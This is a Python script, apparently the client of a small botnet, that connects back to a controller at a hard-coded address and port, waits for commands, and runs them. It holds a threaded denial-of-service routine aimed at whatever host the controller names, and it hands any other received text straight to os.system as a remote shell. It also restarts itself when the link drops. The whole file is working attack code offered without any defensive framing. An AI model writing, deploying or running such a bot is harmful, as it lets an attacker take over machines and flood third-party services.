import socket
import threading
import time
import platform
import os


host = "192.168.1.182"
port = 2121

bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def connecting():
    while True:
        try:
            bot_socket.connect((host, port))
            print("connected")
            break

        except socket.error:
            continue


def main():
    while True:
        try:
            cmd = bot_socket.recv(1024).decode("utf-8")

            # run Dos attack
            if cmd.split(" ")[0] == "use" and cmd.split(" ")[1] == "-dos":

                class Dos:

                    def __init__(self, host, port, nThreads):
                        self.host = host
                        self.port = port
                        self.nThreads = nThreads

                        self.threadslist = []

                        self.message = "SCHOKOLADE" + "genau so lecker wie M&Ms" + "HTTP//1.1.1.1\n\r"

                    def SendAttack(self):
                        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                        try:
                            client_socket.connect((self.host, int(self.port)))
                            client_socket.send(str.encode(self.message))
                            client_socket.sendto(str.encode(self.message), (self.host, int(self.port)))
                            print("working")

                        except socket.error:
                            print("error")

                        client_socket.close()

                    def Attack(self):
                        for i in range(int(self.nThreads)):
                            t = threading.Thread(target=self.SendAttack)
                            self.threadslist.append(t)

                        for i in self.threadslist:
                            try:
                                i.start()

                            except RuntimeError:
                                continue

                        for i in self.threadslist:
                            try:
                                i.join()

                            except RuntimeError:
                                continue

                host = cmd.split(" ")[2]
                port = cmd.split(" ")[3]
                nThreads = cmd.split(" ")[4]

                Dos = Dos(host, port, nThreads)

                bot_socket.send("[*] Starting Attack...".encode())

                Dos.Attack()

                bot_socket.send(("[*] The Attack was done at " + time.strftime("%H:%M:%S")).encode())
                continue

            # testing connection
            elif cmd == "ping":
                try:
                    bot_socket.send("PONG".encode())

                except socket.error:
                    bot_socket.close()
                    exit()

                continue

            # operating system information
            elif cmd == "os":
                bot_socket.send(platform.system().encode())
                continue

            # make command in shell window
            else:
                os.system(cmd)
                bot_socket.send(cmd.encode())

        # connection loop
        except socket.error:
            os.system("python3 Bot.py")
            exit()


connecting()
main()